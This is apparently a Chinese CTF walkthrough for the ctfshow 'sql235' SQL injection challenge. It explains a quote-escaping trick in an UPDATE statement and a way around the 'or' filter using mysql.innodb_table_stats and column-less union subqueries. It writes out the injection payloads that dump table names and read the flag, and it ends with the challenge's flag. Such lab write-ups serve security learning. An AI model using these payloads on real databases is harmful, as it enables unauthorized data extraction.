# ctfshow-sql235



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
```



 返回逻辑 

```
  //过滤 or ' 

```





```mysql
过滤or '因此information表也不能用了
考虑其他表sys也没有
ban了or，其实还暗ban了information_schema，可以拿innoDB引擎来绕过，即这个mysql.innodb_table_stats

https://www.jb51.net/article/134678.htm  统计信息表
https://zhuanlan.zhihu.com/p/98206699 无列名注入
https://blog.csdn.net/qq_45521281/article/details/106647880    information_schema与无列名注入


innodb_table_stats是表的统计信息，innodb_index_stats是索引的统计信息，各字段含义如下
innodb_table_stats
database_name  		数据库名
table_name			表名
last_update			统计信息最后一次更新时间
n_rows				表的行数
clustered_index_size	聚集索引的页的数量
sum_of_other_index_sizes	其他索引的页的数量

innodb_index_stats
database_name		数据库名
table_name			表名
index_name			索引名
last_update			统计信息最后一次更新时间
stat_name			统计信息名
stat_value			统计信息的值
sample_size			采样大小
stat_description		类型说明




原来的语句是
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
但是传入单引号后
$sql = "update ctfshow_user set pass = '\' where username = 'username';";
这样pass里面的内容就是' where username =,接下来username里面的参数就是可以控制的了


mysql中不支持子查询更新，准确的说是更新的表不能在set和where中用于子查询。那串英文错误提示就是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。
update 同一个表注入方法
https://www.cnblogs.com/duanxz/p/5099030.html

# username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &password=\

banlist,ctfshow_user,flag23a1


# username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &password=\
找b 假如第一个是id,第二个是flag那么就可以直接查flag
例如上一题字段id,flagass23s3,info

ctfshow{f6ed0142-b4c3-481c-a327-ac8bcd8b726e}


或者一样的没区别只是如果没过率数字可以这样玩
# username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &password=\



```























